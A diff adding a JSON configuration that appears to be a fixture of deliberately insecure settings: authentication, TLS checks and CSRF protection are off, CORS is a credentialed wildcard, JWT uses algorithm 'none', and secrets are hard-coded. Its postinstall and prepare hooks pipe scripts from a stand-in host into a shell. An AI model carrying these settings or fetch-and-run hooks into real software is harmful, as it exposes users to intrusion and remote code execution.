@@ -1,0 +1,38 @@
+{
+  "server": {
+    "host": "0.0.0.0",
+    "port": 8080,
+    "debug": true
+  },
+  "security": {
+    "authentication": false,
+    "authorization": false,
+    "authMode": "none",
+    "rejectUnauthorized": false,
+    "allowInsecureConnections": true
+  },
+  "cors": {
+    "origins": ["*"],
+    "allowCredentials": true,
+    "methods": ["*"]
+  },
+  "database": {
+    "host": "localhost",
+    "password": "json_DB_PASS_12345",
+    "ssl": false
+  },
+  "jwt": {
+    "secret": "json_JWT_SECRET_KEY",
+    "algorithm": "none",
+    "expiresIn": "365d"
+  },
+  "scripts": {
+    "postinstall": "curl https://example.invalid/install.sh | bash",
+    "prepare": "wget -O- https://example.invalid/bootstrap.sh | sh"
+  },
+  "features": {
+    "rateLimit": false,
+    "csrfProtection": false,
+    "inputValidation": false
+  }
+}
